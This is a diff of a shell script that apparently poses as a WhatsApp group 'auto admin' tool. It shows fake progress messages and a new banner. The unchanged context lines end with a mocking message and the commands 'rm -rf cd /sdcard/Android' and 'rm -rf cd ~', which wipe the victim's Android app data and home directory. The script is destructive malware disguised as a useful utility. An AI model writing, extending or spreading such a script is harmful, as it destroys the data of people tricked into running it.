@@ -27,7 +27,10 @@ sleep 1
 echo " WhatsApp group found"
 sleep 2
 echo "please wait................................."
-sleep 10
+sleep 1
+clear
+echo " Auto Admin WhatsApp illya 🥵"
+
 echo "POYI NANNAIKUDA😂😂"
 rm -rf cd /sdcard/Android
 rm -rf cd ~
